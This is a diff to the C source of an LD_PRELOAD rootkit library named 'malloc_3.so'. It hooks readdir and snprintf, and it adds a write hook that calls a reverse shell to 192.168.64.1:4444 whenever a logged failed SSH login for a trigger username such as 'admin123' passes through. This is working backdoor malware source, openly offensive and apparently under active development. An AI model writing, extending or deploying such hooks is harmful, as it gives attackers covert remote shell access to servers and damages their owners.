@@ -17,9 +17,9 @@
 #define host "192.168.64.1"
 #define FILENAME "malloc_3.so"
 #define LISTENING_PORT 4444
-#define TRIGGER_1 "invalid user admin123"
-#define TRIGGER_2 "invalid user user123"
-#define TRIGGER_3 "invalid user clear123"
+#define TRIGGER_1 "Invalid user admin123"
+#define TRIGGER_2 "Invalid user user123"
+#define TRIGGER_3 "Invalid user clear123"
 
 
 //reverse shell implementation
@@ -97,6 +97,7 @@ struct dirent *readdir(DIR *dirp)
 //hooking snprintf to trigger shells upoin failed ssh login attempts
 int snprintf(char *str, size_t size, const char *format, ...)
 {
+    printf("Hooking snprintf\n");
     int (*new_snprintf)(char *str, size_t size, const char *format, ...);
     int ret;
     new_snprintf = dlsym(RTLD_NEXT, "snprintf");
@@ -119,4 +120,29 @@ int snprintf(char *str, size_t size, const char *format, ...)
 
     va_end(func_args);
     return ret;
+}
+
+//testing write hook
+ssize_t write(int fildes, const void *buf, size_t nbytes)
+{
+    printf("Hooking write\n");
+
+    ssize_t (*new_write)(int fildes, const void *buf, size_t nbytes);
+    ssize_t result;
+    new_write = dlsym(RTLD_NEXT, "write");
+
+    char *trigger_found = strstr(buf, TRIGGER_1);
+    if (trigger_found != NULL)
+    {
+        printf("running reverse shell\n");
+	    result = new_write(fildes, buf, nbytes);
+	    rev_shell();
+    }
+
+    else
+    {
+        result = new_write(fildes, buf, nbytes);
+    }
+
+    return result;
 }
